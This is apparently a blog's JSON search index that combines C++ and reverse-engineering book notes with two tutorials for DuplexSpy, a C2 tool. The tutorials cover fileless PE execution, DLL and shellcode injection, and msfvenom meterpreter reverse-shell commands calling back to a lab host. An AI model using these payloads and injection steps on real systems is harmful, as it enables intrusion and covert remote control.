PROCESS_ENERGY_TRACKING_STATE    ProcessManageWritesToExecutableMemory,          // s: MANAGE_WRITES_TO_EXECUTABLE_MEMORY // since REDSTONE3    ProcessCaptureTrustletLiveDump,                 // q: ULONG    ProcessTelemetryCoverage,                       // q: TELEMETRY_COVERAGE_HEADER; s: TELEMETRY_COVERAGE_POINT    ProcessEnclaveInformation,    ProcessEnableReadWriteVmLogging,                // qs: PROCESS_READWRITEVM_LOGGING_INFORMATION    ProcessUptimeInformation,                       // q: PROCESS_UPTIME_INFORMATION    ProcessImageSection,                            // q: HANDLE    ProcessDebugAuthInformation,                    // s: CiTool.exe --device-id // PplDebugAuthorization // since RS4 // 90    ProcessSystemResourceManagement,                // s: PROCESS_SYSTEM_RESOURCE_MANAGEMENT    ProcessSequenceNumber,                          // q: ULONGLONG    ProcessLoaderDetour,                            // qs: Obsolete // since RS5    ProcessSecurityDomainInformation,               // q: PROCESS_SECURITY_DOMAIN_INFORMATION    ProcessCombineSecurityDomainsInformation,       // s: PROCESS_COMBINE_SECURITY_DOMAINS_INFORMATION    ProcessEnableLogging,                           // qs: PROCESS_LOGGING_INFORMATION    ProcessLeapSecondInformation,                   // qs: PROCESS_LEAP_SECOND_INFORMATION    ProcessFiberShadowStackAllocation,              // s: PROCESS_FIBER_SHADOW_STACK_ALLOCATION_INFORMATION // since 19H1    ProcessFreeFiberShadowStackAllocation,          // s: PROCESS_FREE_FIBER_SHADOW_STACK_ALLOCATION_INFORMATION    ProcessAltSystemCallInformation,                // s: PROCESS_SYSCALL_PROVIDER_INFORMATION // since 20H1 // 100    ProcessDynamicEHContinuationTargets,            // s: PROCESS_DYNAMIC_EH_CONTINUATION_TARGETS_INFORMATION    ProcessDynamicEnforcedCetCompatibleRanges,      // s: PROCESS_DYNAMIC_ENFORCED_ADDRESS_RANGE_INFORMATION // since 20H2    ProcessCreateStateChange,                       // s: Obsolete // since WIN11    ProcessApplyStateChange,                        // s: Obsolete    ProcessEnableOptionalXStateFeatures,            // s: ULONG64 // EnableProcessOptionalXStateFeatures    ProcessAltPrefetchParam,                        // qs: OVERRIDE_PREFETCH_PARAMETER // App Launch Prefetch (ALPF) // since 22H1    ProcessAssignCpuPartitions,                     // s: HANDLE    ProcessPriorityClassEx,                         // s: PROCESS_PRIORITY_CLASS_EX    ProcessMembershipInformation,                   // q: PROCESS_MEMBERSHIP_INFORMATION    ProcessEffectiveIoPriority,                     // q: IO_PRIORITY_HINT // 110    ProcessEffectivePagePriority,                   // q: ULONG    ProcessSchedulerSharedData,                     // q: SCHEDULER_SHARED_DATA_SLOT_INFORMATION // since 24H2    ProcessSlistRollbackInformation,    ProcessNetworkIoCounters,                       // q: PROCESS_NETWORK_COUNTERS    ProcessFindFirstThreadByTebValue,               // q: PROCESS_TEB_VALUE_INFORMATION // NtCurrentProcess    ProcessEnclaveAddressSpaceRestriction,          // qs: // since 25H2    ProcessAvailableCpus,                           // q: PROCESS_AVAILABLE_CPUS_INFORMATION    MaxProcessInfoClass&#125; PROCESSINFOCLASS;//Source: https://ntdoc.m417z.com/processinfoclass\nProcessDebugPort(0x7)DWORD dwDebugPort = 0;pNtQueryInformationProcess(GetCurrentProcess(), ProcessDebugPort, &amp;dwDebugPort, sizeof(dwDebugPort), NULL);printf(&quot;NtQueryInformationProcess(PorcessDebugPort) = 0x%X\\n&quot;, dwDebugPort);if (dwDebugPort != 0x0)    printf(&quot;\\t=&gt; Debugging.\\n&quot;);else    printf(&quot;\\t=&gt; Not debugging.\\n&quot;);\nCheckRemoteDebuggerPresent()\nProcessDebugObjectHandle(0x1E)ProcessDebugFlags(0x1F)51.4 - NtQuerySystemInformation()51.5 - NtQueryObject()51.6 - ZwSetInformationThread()51.7 - TLS Callback Function51.8 - ETCChapter 52 - Dynamic Anti-Debugging Techniques52.2 - ExceptionSEHSetUnhandledExceptionFilter()52.3 - Time CheckingInterval\nCOunter based method\nTime based method\n\nRDTSC52.4 - Trap Flag52.5 - 0xCCChapter 53 - Advanced Anti-Debugging53.1 - Advanced Anti-Debugging53.2 - Garbage Code53.3 - Breaking Code Alignment53.4 - Encryption/Decription53.5 - Stolen Bytes (Remove OEP)\n\n\n53.6 - API Relocation53.7 - Debug Blocker (Self Debugging)Chapter 54 - Practice#1: ServiceChapter 55 - Practice#2: Self CreationChapter 56 - Practice#3: PE Image SwitchingChapter 57 - Practice#4: Debug BlockerTHANKS FOR READING\n","categories":["Book"],"tags":["Book","Learning","Study","Note","Reverse Engineering","OllyDbg","Assembly","PE","CrackMe"]},{"title":"[Book] C++ Templates - The Complete Guide (Second Edition)","url":"/2026/01/07/2026-1-7-CppTemplatesTheCompleteGuide2ed/","content":"El libro\n\n\nIntroductionThis article is used to keep notes and summaries of the book “C++ Templates - The Complete Guide (Second Edition)”.The content will be continuously updated as I read through the book.\nReflectionChapter.1 - Function Templates1.1 - Function Templatestemplate&lt;typename T&gt;T max(T a, T b)&#123;  return b &lt; a ? a : b;&#125;\ntemplate parameters must be announced with syntax of the following form:template&lt;comma-separated-list of parameters&gt;Here, the type parameter is T. You can use any identifier as a parameter name, but using T is the convention. The type parameter represents an arbitrary type that is determined by the caller when the caller calls the function.\nFor historical reasons, you can also use the keyworkd class instead of typename to define a type parameter.template&lt;class T&gt;T max(T a, T b)&#123;  return b &lt; a ? a : b;&#125;Semantically there is no difference. However, because this use of class can be misleading(not only class types can be substituted for T), you should prefer the use of typename in this context.The keyword struct cannot be used in place of typename when declaring type parameters.\nExample of using max() function template:#include &lt;iostream&gt;#include &lt;string&gt;#include &quot;max1.hpp&quot;int main()&#123;  int i = 42;  std::cout &lt;&lt; &quot;max(7, i): &quot; &lt;&lt; ::max(7, i) &lt;&lt; std::endl;  double f1 = 3.4;  double f2 = -6.7;  std::cout &lt;&lt; &quot;max(f1, f2): &quot; &lt;&lt; ::max(f1, f2) &lt;&lt; std::endl;  std::string s1 = &quot;mathematics&quot;;  std::string s2 = &quot;math&quot;;  std::cout &lt;&lt; &quot;max(s1, s2): &quot; &lt;&lt; ::max(s1, s2) &lt;&lt; std::endl;&#125;Output:max(7,i): 42max(f1,f2): 3.4max(s1,s2): mathematicsNote that each call of the max() template is qualified with ::. This is to ensure that our max() template is found in the global namespace. This is also a std::max() template in the standard libaray, which under some circumstances may be called or maylead to ambiguity.\nvoid is a valid template argument provided the resulting code is valid:template&lt;typename T&gt;T foo(T*)&#123;&#125;void *vp = nullptr;foo(vp); //OK//foo(void*); NOT OK\nTwo-Phase TranslationAn attempt to instantiate a template for a type that doesn’t support all the operations used within it will result in a compile-time error:std::complex&lt;flat&gt; c1, c2; //doesn&#x27;t provide operator &lt;...::max(c1, c2);templates are compiled in two phase:\n\nWithout instantiation at definition time, the template code itself is checked for correctness ignoring the template parameters:\nSyntax errors.\nUsing unknown names.\nStatic assertions that don’t depend on template parameters are checked.\n\n\nAt instantiation time, the template code is checked(again) to ensure that all code is valid.\n\ntemplate&lt;typename T&gt;void foo(T t)&#123;  undeclared(); // first-phase compile-time error if undeclared() unknown  undeclared(t); // second-phase compile-time error if undeclared(T) unknown  static_assert(sizeof(int) &gt; 10, // always fails if sizeof(int)&lt;=10 &quot;int too small&quot;);  static_assert(sizeof(T) &gt; 10, //fails if instantiated for T with size &lt;=10 &quot;T too small&quot;);&#125;\n1.2 - Template Arugment DeductionAutomatic type conversions are limited during type deduction:\n\nWhen declaring call parameters by reference, even trivial conversions do not apply to type deduction. Two arguments declared with the same template parameter T must match exactly.\nWhen declaring call parameters by value, only trivial conversions that decay are supported: Qualifications with const or volatile are ignored, references convert to the referenced type, and raw arrays or functions convert to the corresponding pointer type.\n\ntemplate&lt;typename T&gt;T max (T a, T b);… int const c = 42;max(i, c); // OK: T is deduced as intmax(c, c); // OK: T is deduced as intint&amp; ir = i;max(i, ir); // OK: T is deduced as intint arr[4];foo(&amp;i, arr); // OK: T is deduced as int*\nmax(4, 7.2); //ERROR: T can be deduced as int or doublestd::string s;foo(&quot;Hello&quot;, s); //ERROR: T can be deduced as char const[6] or std::string\nThere are three ways to handle such errors:\n\nCast the arguments so that they both match:max(static_cast&lt;double&gt;(4), 7.2);\nSpecify(or qualify) explicity the type of T to prevent the compiler from attempting type deduction:max&lt;double&gt;(4, 7.2);\nSpecify that the parameters may have different types.\n\nType Deduction for Default Argumentstemplate&lt;typename T&gt;void f(T = &quot;&quot;);f(1); //OK: deduced T to be int, so that it calls f&lt;int&gt;(1)f(); //ERROR: cannot deduce TTo support this case:template&lt;typename T = std::string&gt;void f(T = &quot;&quot;);...f(); //OK\n\nImportant: Template argument deduction is performed before default arguments are considered.\n\n1.3 - Multiple Template Parameterstemplate&lt;typename T1, typename T2&gt;T1 max (T1 a, T2 b)&#123;  return b &lt; a ? a : b; &#125;… auto m = ::max(4, 7.2); // OK, but type of first argument defines return type\nTemplate Parameters for Return Typestemplate&lt;typename T1, typename T2, typename RT&gt;RT max (T1 a, T2 b);\nHowever, template argument deduction does not take return types into account, and RT does not appear in the types of the function call parameters. Therefore, RT cannot be deduced.\n\ntemplate&lt;typename T1, typename T2, typename RT&gt;RT max (T1 a, T2 b);…::max&lt;int,double,double&gt;(4, 7.2); // OK, but tedious\ntemplate&lt;typename RT, typename T1, typename T2&gt;RT max (T1 a, T2 b);…::max&lt;double&gt;(4, 7.2) //OK: return type is double, T1 and T2 are deduced\nDeducing the Return TypeSince C++14, this is possible by simply not declaring any return type(you still have to declare the return type to be auto):template&lt;typename T1, typename T2&gt;auto max(T1 a, T2 b)&#123;  return b &lt; a ? a : b;&#125;\nBefore C++14, it is only possible to let the compiler determine the return type by more or less making the implementation of the function part of its declaration. In C++11 we can benefit from the fact that the trailing return type syntax allows us to use the call parameters. That is, we can declare that the return type is derived from what operator?: yields:template&lt;typename T1, typename T2&gt;auto max(T1 a, T2 b) -&gt; decltype(b &lt; a ? a : b)&#123;  return b &lt; a ? a : b;&#125;template&lt;typename T1, typename T2&gt;auto max(T1 a, T2 b) -&gt; decltype(b&lt;a?:a:b);#include &lt;type_traits&gt;template&lt;typename T1, typename T2&gt;auto max(T1 a, T2 b) -&gt; typename std::decay&lt;decltype(true ? a : b)&gt;::type&#123;  return b &lt; a ? a : b;&#125;\n1.4 - Default Template ArgumentsYou can also define values for template parameters. These values are called default template arguments and can be used with any kind of template.\n#include &lt;type_traits&gt;template&lt;typename T1, typename T2, typename RT = std::decay_t&lt;decltype(trye ? T1() : T2())&gt;&gt;RT max(T1 a, T2 b)&#123;  return b &lt; a ? a : b;&#125;\nNote again the usage of std::decay_t&lt;&gt; to ensure that no reference cna be returned.\nNote also that this implementation requires that we are able to call default constructors for the passed types. There is another solution, using std::declval, which, however, make the declaration even more complicated(Section 11.2.3)\nWe can also use the std::common_type&lt;&gt; type trait to specify the default value for the return type:#include &lt;type_traits&gt;template&lt;typename T1, typename T2, typename RT = std::common_type_t&lt;T1, T2&gt;&gt;RT max(T1 a, T2 b)&#123;  return b &lt; a ? a : b;&#125;auto a = ::max(4, 7.2);auto b = ::max&lt;double, int, long double&gt;(7.2, 4);However, again we have the problem that we have to specify three types to be able to specify the return type only.  \nWe would need the ability to have the return type as the first template parameter, while still begin able to deduce it from the argument types.  \nIt is possible to have default arguments for leading function template parameters even if parameters without default arguments follow:template&lt;typename RT = long, typename T1, typename T2&gt;RT max(T1 a, T2 b)&#123;  return b &lt; a ? a : b;&#125;int i;long l;...max(i, l); //returns long(default argument of template parameter for returns type).max&lt;int&gt;(4, 42); //returns int as explicitly requested\n1.5 - Overloading Function TemplatesLike ordinary functions, function templates can be overloaded. That is, you can have different function difinitions with the same function name so that when that name is used in a function call, a C++ compiler must decide which one of the various candidates to call.\n//maximum of two int values:int max(int a, int b)&#123;  return b &lt; a ? a : b;&#125;//maximum of two values of any type:template&lt;typename T&gt;T max(T a, T b)&#123;  return b &lt; a ? a : b;&#125;int main()&#123;  ::max(7, 42); // calls the nontemplate for two ints  ::max(7.0, 42.0); // calls max&lt;double&gt; (by argument deduction)  ::max(&#x27;a&#x27;, &#x27;b&#x27;); // calls max&lt;char&gt; (by argument deduction)  ::max&lt;&gt;(7, 42); // calls max&lt;int&gt; (by argument deduction)  ::max&lt;double&gt;(7, 42); // calls max&lt;double&gt; (no argument deduction)  ::max(&#x27;a&#x27;, 42.7); // calls the nontemplate for two ints&#125;\nIf the template can generate a function with a better match, however, then the template is selected.::max(7.0, 42.0); // calls the max&lt;double&gt; (by argument deduction)::max(&#x27;a&#x27;, &#x27;b&#x27;); // calls the max&lt;char&gt; (by argument deduction)Here, the template is a better match because no conversion from double or char to int is required.\n::max(&#x27;a&#x27;, 42.7);\nBecause automatic type conversion is not considered for deduced template parameters but is considered for ordinary function parameters, the last call uses the nontemplate function(while a and 42.7 both converted to int).\n\ntemplate&lt;typename T1, typename T2&gt;auto max (T1 a, T2 b)&#123;  return b &lt; a ? a : b;&#125;template&lt;typename RT, typename T1, typename T2&gt;RT max (T1 a, T2 b)&#123;  return b &lt; a ? a : b;&#125;\nNew, we can call max():auto a = ::max(4, 7.2); //uses first template.auto b = ::max&lt;long double&gt;(7.2, 4); //uses second template, since the number of parameters is not matched for first template.auto c = ::max&lt;int&gt;(4, 7.2); //ERROR: both function templates match.\n\nA useful example would be to overload the maximum template for pointers and ordinary C-strings:#include &lt;cstring&gt;#include &lt;string&gt;//maximum of two values of any type:template&lt;typename T&gt;T max(T a, T b)&#123;  return b &lt; a ? a : bl&#125;//maximum of two pointers:template&lt;typename T&gt;T* max(T *a, T *b)&#123;  return *b &lt; *a ? a : b;&#125;//maximum of two C-strings:char const* max(char const* a, char const* b)&#123;  return std::strcmp(b, a) &lt; 0 ? a : b;&#125;int main()&#123;  int a = 7;  int b = 42;  auto m1 = ::max(a,b); // max() for two values of type int  std::string s1 = &quot;hey&quot;;  std::string s2 = &quot;you&quot;;  auto m2 = ::max(s1,s2); // max() for two values of type std::string  int* p1 = &amp;b;  int* p2 = &amp;a;  auto m3 = ::max(p1,p2); // max() for two pointers  char const* x = &quot;hello&quot;;  char const* y = &quot;world&quot;;  auto m4 = ::max(x,y); // max() for two C-strings&#125;Note that in all overloads of max() we pass the arguments by value. In general, it is good idea not to change more than necessary when overloading function templates. You should limit your changes to the number of parameters or to specifying template parameters explicitly. Otherwise, unexpected effects may happen.\n#include &lt;iostream&gt;template&lt;typename T&gt;T max(T a, T b)&#123;  std::cout &lt;&lt; &quot;max&lt;&gt;()&quot; &lt;&lt; endl;  return b &lt; a ? a : b;&#125;// maximum of three values of any type:template&lt;typename T&gt;T max (T a, T b, T c)&#123;  return max (max(a,b), c); // uses the template version even for ints&#125; // because the following declaration comes  // too late:// maximum of two int values:int max (int a, int b)&#123;  std::cout &lt;&lt; &quot;max(int,int) \\n&quot;;  return b &lt; a ? a : b;&#125;int main()&#123;  ::max(47,11,33); // OOPS: uses max&lt;T&gt;() instead of max(int,int)&#125;\n1.6 - But, Shouldn’t We…?Pass by Value or by Reference?Why not inline?In general, function templates don’t have to be declared with inline. Unlike ordinary.The only exception to this rule are full specializations of templates for specific types, so that the resulting code is no longer generic (all template parameters are defined).\nWhy not constexpr?Since C++11, you can use constexpr to provide the ability to use code to compute some values at compile time. For a lost of templates this makes sense.\nFor example, to be able to use the maximum function at compile time, you have to declare it as follows:template&lt;typename T1, typename T2&gt;constexpr auto max(T1 a, T2 b)&#123;  return b &lt; a ? a : b;&#125;With this, you can use the maximum function template in places with compile-time context, such as when declaring the size of a raw array:int a[::max(sizeof(char), 1000u)];or the size of a std::array&lt;&gt;:std::array&lt;std::string, ::max(sizeof(char), 1000u)&gt; arr;\nChapter.2 - Class Template2.1 - Implementation of Class Template Stack//stack1.hpp#include &lt;vector&gt;#include &lt;cassert&gt;template&lt;typename T&gt;class Stack &#123;private:  std::vecotr&lt;T&gt; elems; //elementspublic:  void push(T const&amp; elem); //push element  void pop(); //pop element  T const&amp; top() const; //return top element  bool empty() const &#123; //return whether the stack is empty.    return elems.empty();  &#125;&#125;template&lt;typename T&gt;void Stack&lt;T&gt;::push (T const&amp; elem)&#123;  elems.push_back(elem); //append copy of passed elem&#125;template&lt;typename T&gt;void Stack&lt;T&gt;::push (T const&amp; elem)&#123;  elems.push_back(elem);&#125;template&lt;typename T&gt;void Stack&lt;T&gt;::pop()&#123;  assert(!elems.empty());  elems.pop_back();&#125;template&lt;typename T&gt;T const&amp; Stack&lt;T&gt;::top() const&#123;  assert(!elems.empty());  return elems.back();&#125;\n\nIf, for example, you have to declare your own copy constructor and assignment operator, it typically looks like this:template&lt;typename T&gt;class Stack &#123;  ...  Stack (Stack const&amp;);             //copy constructor  Stack&amp; operator= (Stack const&amp;);  //assignment operator  ...&#125;which is formally equivalent to:template&lt;typename T&gt;class Stack &#123;  ...  Stack (Stack&lt;T&gt; const&amp;);  Stack&lt;T&gt;&amp; operator= (Stack&lt;T&gt; const&amp;);  ...&#125;but usually the &lt;T&gt; signals special handling of special template parameters, so it’s usually better to use the first form.\nHowever, outside the class structure you’d need:template&lt;typename T&gt;bool operator== (Stack&lt;T&gt; const&amp; lhs, Stack&lt;T&gt; const&amp; rhs);Note that in place where the name and not type of the class is required, only Stack may be used.\nImplementation of Member FunctionsTo define a member function of a class template, you have o specify that it is a template, and you have to use the full type qualification of the class template.\ntemplate&lt;typename T&gt;void Stack&lt;T&gt;::push(T const&amp; elem)&#123;  elems.push_back(elem); //append copy of passed elem.&#125;\nIn this case, push_back() of the element vector is called, which appends the element at the end of the vector.\nNote that pop_back() of vector removes the last elemtn but does not return it.It is impossible to implement a completely exception-safe version of pop() that returns the removed. However, ignoring this danger, we could implement a pop() that returns the element just removed.template&lt;typename T&gt;T Stack&lt;T&gt;::pop()&#123;  assert(!elems.empty());  T elem = elems.back();  //save copy of last element.  elems.pop_back();       //remove last element.  return elem;            //return copy of saved element.&#125;\n2.2 - Use of Class Template Stack//stack1.cpp#include &quot;stack1.hpp:#include &lt;iostream&gt;#include &lt;string&gt;int main()&#123;  Stack&lt;int&gt; intStack;  Stack&lt;std::string&gt; stringStack;  //manipulate int stack  intStack.push(7);  std::cout &lt;&lt; intStack.top() &lt;&lt; &#x27;\\n&#x27;;  //manipulate string stack  stringStack.push(&quot;hello&quot;);  std::cout &lt;&lt; stringStack.top() &lt;&lt; &#x27;\\n&#x27;;  stringStack.pop();&#125;\n\nAn instantiated class template’s type can be used just like any other type.void foo(Stack&lt;int&gt; const&amp; s)   //parameter `s` is `int` stack.&#123;  using IntStack = Stack&lt;int&gt;;  //IntStack is another name for `Stack&lt;int&gt;`.  Stack&lt;int&gt; istack[10];        //`istack` is an array of 10 `int` stacks.  IntStack istack2[10];         //`istack2` is also an array of 10 `int` stacks (same type).&#125;\n\nTemplate arguments may be any type, such as pointers to float or even stack of int:Stack&lt;float*&gt; flatPtrStack;       //stack of `float` pointers.Stack&lt;Stack&lt;int&gt;&gt; intStackStack;  //stack of stack of ints.\nNote that before C++11 you had to put whitespace between the two closing template brackets:Stack&lt;Stack&lt;int&gt; &gt; intStackStack; // OK with all C++ versionsIf you didn’t do this, you were using operator &gt;&gt;, which resulted in a syntax error:Stack&lt;Stack&lt;int&gt;&gt; intStackStack; // ERROR before C++11The reason for the old behavior was that it helped the first pass of a C++ compiler to tokenize thesource code independent of the semantics of the code\n2.3 - Partial Usage of Class TemplatesInstead of print the stack contents with printOn it is better to implement operator&lt;&lt; for the stack. However, as usual operator&lt;&lt; has to be implemented as nonmember function, which then could call printOn() inline:template&lt;typename T&gt;class Stack &#123;  ...  void printOn() (std::ostream&amp; strm) const &#123;    ...  &#125;  friend std::ostream&amp; operator&lt;&lt; (std::ostream&amp; strm, Stack&lt;T&gt; const&amp; s) &#123;    s.printOn(strm);    return strm;  &#125;&#125;;\n2.4 - Friends2.5 - Specializations of Class TemplatesSpecializing class templates allows you to optimizeimplementations for certain types or to fix a misbehavior of certain types for an instantiation of the class template.\nIf you specialize a class template, you must also specialize all member functions. Although it is possible to specialize a single member function of a class template, once you have done so, you can no longer specialize the whole class template instance that the specialized member belongs to.\nTo specialize a class template, you have to declare the class with a leading template&lt;&gt; and a specification of the types for which the class template is specialized. The types are used as a template argument and must be specified directly following the name of the class:template&lt;&gt;class Stack&lt;std::string&gt; &#123;  ...&#125;;\nFor these specializations, any definition of a member function must be defined as an “ordinary” member function, which each occurence of T begin replaced by the specialized type:void Stack&lt;std::string&gt;::push (std::string const&amp; elem)&#123;  elems.push_back(elem);&#125;\n2.6 - Partial SpecializationClass templates can be partially specialized. You can provide special implementations for particular circumstances, but some template parameters must still be defined by the user.\nFor example, we can define a special implementation of class `Stack&gt; for pointers:#include &quot;stack1.hpp&quot;template&lt;typename T&gt;class Stack&lt;T*&gt; &#123;private:  std::vector&lt;T*&gt; elems;public:  void push(T*);  T* pop();  T* top() const;  bool empty() const &#123;    return elems.empty();  &#125;&#125;template&lt;typename T&gt;void Stack&lt;T*&gt;::push (T* elem)&#123;  elems.push_back(elem);&#125;template&lt;typename T&gt;T* Stack&lt;T*&gt;::pop()&#123;  assert(!elems.empty());  T* p = elems.back();  elems.pop_back();  return p;&#125;template&lt;typename T&gt;T* Stack&lt;T*&gt;::top() const&#123;  assert(!elems.empty());  return elems.back();&#125;\n2.7 - Default Class Template Arguments2.8 - Type Aliases2.9 - Class Template Argument Deduction2.10 - Templatized AggregatesChapter.3 - Nontype Template Parameters","categories":["Book"],"tags":["Book","Learning","Note","Code","Programming","C++","Coding","Program","Templates"]},{"title":"[Book] Linux Firewalls: Enhancing Security with nftables and Beyond, 4/e","url":"/2026/01/09/2026-1-9-BookLinuxFirewall/","content":"El Libro\n\n\nIntroductionThis article is used to keep notes and summaries of the book “Linux Firewalls: Enhancing Security with nftables and Beyond, 4/e”.The content will be continuously updated as I read through the book.\n"},{"title":"[DuplexSpy] Fileless Execution","url":"/2026/02/03/2026-2-3-DuplexSpyFilelessExec/","content":"IntroductionThis article demonstrates how to use the Fileless Execution feature of DuplexSpy.\nThis feature allows you to execute a PE (Portable Executable) file on a compromised machine without writing it to disk.\nPrincipleThe C2 server sends raw PE file bytes to the compromised machine. The DuplexSpy payload loads these PE bytes into memory and executes them. When the payload receives a fileless execution command, it creates a new process to execute the PE entirely from memory.\nThe figure below illustrates the execution flow:\n\n\n\nThe x64 version of PE loader is based on the implementation by Casey Smith. However, I have developed the x86 version in case the C# payload uses the x86 platform.\nNote that a loader can only execute PE files that match its architecture. An x64 loader cannot execute x86 PE files and vice versa. Make sure you identify the architecture of the target PE and select the matched loader.\n\n\n\nGetting StartedExample 1 - x64 msfvenomFirst, check the architecture of the executed payload:\n\n\n\n\n\n\nGenerate an x64 Messagebox payload:$ msfvenom -p windows/x64/messagebox TEXT=&quot;msf hello world&quot; -f exe &gt; x64.exe\n\n\n\nThe x64.exe is executed successfully without being written to disk. This is fileless execution. Next, check the process list:\ntasklist | find &quot;client.exe&quot;\nHere client.exe is your DuplexSpy payload.\n\n\n\nTwo instance of client.exe (the DuplexSpy payload) are running. One instance maintains communication with the C2 server, while the other is for executing the filesless payload.\n\n\n\nExample 2 - x86 meterpreter$ msfvenom -p windows/meterpreter/reverse_tcp -a x86 lhost=192.168.1.192 lport=4444 -f exe -a x86 &gt; x86.exe\n\n\n\n\n\n\n\nExample 3 - x86 calc.exeNow, try executing a more complex application:\n\n\n\nTHANKS FOR READING!\n","categories":["Tools/DuplexSpy"],"tags":["DuplexSpy","Tools","Fileless Execution","Document"]},{"title":"[DuplexSpy] DLL and Shellcode Injection and Loader","url":"/2026/02/03/2026-2-3-DuplexSpyDllAndShellcode/","content":"IntroductionThis article demonstrates how to use the DLL and shellcode injection features of DuplexSpy.\nThis feature allows you to inject a DLL or shellcode into a target process. DuplexSpy also provides a DLL loader and a shellcode loader, which allows you to execute payloads without injecting them into an existing process.\nIf you would like to learn more about DLL and shellcode injection techniques, you can refer to the notes I wrote for studying reverse engineering and Windows buffer overflow.\nInjectorThis features allows you to inject a DLL file or shellcode in a specified process. However, due to Windows security protections, this method may not always work.\nNote that the DLL file or shellcode must match the architecture of the target process (x86 or x64). An x86 process canoot load an x64 DLL or shellcode, and vice versa.\nDuplexSpy provides the following injection methods for both DLL and shellcode:\n\nAPC\nEarly Bird\nCreateRemoteThread (default)\nNtCreateThreadEx\nZwCreateThreadEx\n\nBefore performing an injection, you should determine the architecture of the target process. An x86 DLL cannot be injected into an x64 process, and vice versa. On x64 systems, PE files uder C:\\Windows\\System32 are typically x64 binaries, while PE files under C:\\Windows\\SysWOW64 are x86 binaries.\n\n\n\nGetting StartedDLL InjectionNotice that this method IS NOT fileless. A DLL file will be created under %TEMP% directory and might be detected or deleted by antivirus software.\nThe CreateRemoteThread method is recommended for DLL injection.\nIn this example, Kali Linux is used to establish a Meterpreter reverse TCP connection via DLL injection.\n\n\n\n\nField\nValue\n\n\n\n\nTarget process\nC:\\Windows\\SysWOW64\\notepad.exe\n\n\nKali host\n192.168.1.192\n\n\nKali port\n4444\n\n\n\n\nBuild an x86 payload using msfvenom:$ msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.1.192 lport=4444 -a x86 -f dll &gt; x86.dll\nMsfconsole:$ msfconsolemsf&gt; use exploit/multi/handlermsf&gt; set payload windows/meterpreter/reverse_tcpmsf&gt; set lhost 192.168.1.192msf&gt; set lport 4444msf&gt; run\n\n\n\nCreateRemoteThreadLet’s try the CreateRemoteThread method:\n\n\n\n\n\n\n\n\n\nNotice that the log messages in the box are not always reliable. A DuplexSpy payload cannot check your msf payload!\nNext, exit your meterpreter session:meterpreter&gt; exit\nProcess notepad.exe is still running!\nNtCreateThreadExNtCreateThreadEx method:\n\n\n\nIt works again ( . 3 .)\n\n\n\nZwCreateThreadEx\n\n\nShellcode InjectionThis method is fileless.\nThe CreateRemoteThread method is recommended for shellcode injection.\nUse the following command to generate a meterpreter shellcode:msfvenom -p windows/meterpreter/reverse_tcp -a x86 -f c\nPaste the output into the shellcode editor of DuplexSpy.\n\n\n\nClick the “Formatting” button at the top of the window form. You can also click the “Save” button, DuplexSpy automatically runs the “Formatting” function.\n\n    \n    Formatting\n    \n\n\nCreateRemoteThread\n\n\nNtCreateThreadEx\n\n\nZwCreateThreadExLastly, let’s try the ZwCreateThreadEx method. \n\n\n\n\n\n\nLoaderDuplexSpy allows you to load a DLL file or shellcode directly without injecting it into an existing process. As with injection, the payload architecture must match the loader architecture (x86 or x64).\nFor performance reasons, DuplexSpy creates a new process for both DLL and shellcode loading. This behavior is similar to the fileless execution features of DuplexSpy; however, the loader architecture cannot be selected manually. If the DuplexSpy payload is x64, only x64 DLLs or shellcodes can be loaded.\n\n\n\nDLL LoaderNote that this method is not fileless. \n\n\n\n\n\n\nShellcode LoaderDuplexSpy allows you to load shellcode into memory. It is a fileless method.\n\n\n\n\n\n\n\n\n\nTHANKS FOR READING!\n","categories":["Tools/DuplexSpy"],"tags":["DuplexSpy","Tool","DLL Injection","Shell Injection","DLL Loader","Shell Loader"]},{"title":"[Book] C++ Concurrency In Action (Second Edition)","url":"/2026/01/08/2026-1-8-BookCppConcurrencyInAction2ed/","content":"El Libro\n\n\nIntroductionThis article is used to keep notes and summaries of the book “C++ Concurrency In Action (Second Edition)”.The content will be continuously updated as I read through the book.\nReflectionChapter.1 - Hello, world of concurrency1.1 - What is concurrencyAt the simplest and most basic level, concurrency is about two or more separate activities happening at the same time. You can watch football while I go swimming, and so on.\nWhen we talk about concurrency in terms of computers, we mean a single system performing multiple independent activities in parallel, rather than sequentially, or one after the other.\nConcurrency vs. ParallelismConcurrency and parallelism have largely overlapping meanings with respect to multithreaded code. Indeed, to many they mean the same thing.\nThe difference is primarily a matter of nuance, focus, and intent. Both terms are about running multiple tasks simultaneously, using the available hardware, but parallelism is much more performance-oriented.  \nPeople talk about parallelism when their primary concern is talking advantage of the avaiable hardware to increase the performance of bulk data processing.\nPeople talk about concurrency when their primary concern is separation of concerns, or responsiveness.\n1.4 - Getting Started#include &lt;iostream&gt;#include &lt;thread&gt;void hello()&#123;    std::cout &lt;&lt; &quot;Hello concurrent world.\\n;&#125;int main()&#123;    std::thread t(hello);    t.join();&#125;\nEvery thread has to have an initial function, where the new thread of execution begins. For the initial thread in an application, this is main(), but for every other thread it’s specified in the constructor of a std::thread object——in this case, the std::thread objecct named t has the new hellow() function as its initial function.\nWith join(), the program possibily ends before the new thread had a chance to run.\nChapter.2 - Managing threads2.1 - Basic thread managementEvery C++ program has at least one thread, which is started by the C++ runtime: the thread running main().\nclass background_task&#123;public:    void operator()() const    &#123;        do_something();        do_something_else();    &#125;&#125;;background_task f;std::thread my_thread(f);\nstd::thread my_thread(background_task());\nOne type of callable object that avoids this problem is a lambda expression. This is a new feature from C++11:std::thread my_thread([] &#123;    do_something();    do_something_else();&#125;)\n\nstruct func&#123;    int&amp; i;    func(int&amp; i_): i(_)&#123;&#125;    void operator()()    &#123;        for (unsigned j = 0; j &lt; 10000000; ++j)        &#123;            do_something(i);        &#125;    &#125;&#125;;void oops()&#123;    int some_local_state=0;    func my_func(some_local_state);    std::thread my_thread(my_func);    my_thread.detach();&#125;\nIn this case, the new thread associated with my_thread will probably still be running when oops exists, because you’ve explicitly decided not to wait for it by calling detach(). The program will be terminated if detach() isn’t called.\nIf the thread is still running, you have this scenario: the nexst call to do_something(i) will access an already destroyed variable. This is like normal single-threaded code——allowing a pointer or reference to a local variable to persist beyond the function exit is never a good idea——but it’s earier to make the mistake with multithreaded code, because it isn’t necessarily immediately apparent that this has happened.\nIn particular, it’s a bad idea to create a thread within a function that has access to the local variables in that function, unless the thread is guarateed to finish before the function exits.\n\nstruct func;void f()&#123;    int some_local_state = 0;    func my_func(some_local_state);    std::thread t(my_func);    try    &#123;        do_something_in_current_thread();    &#125;    catch (...)    &#123;        t.join();        throw;    &#125;    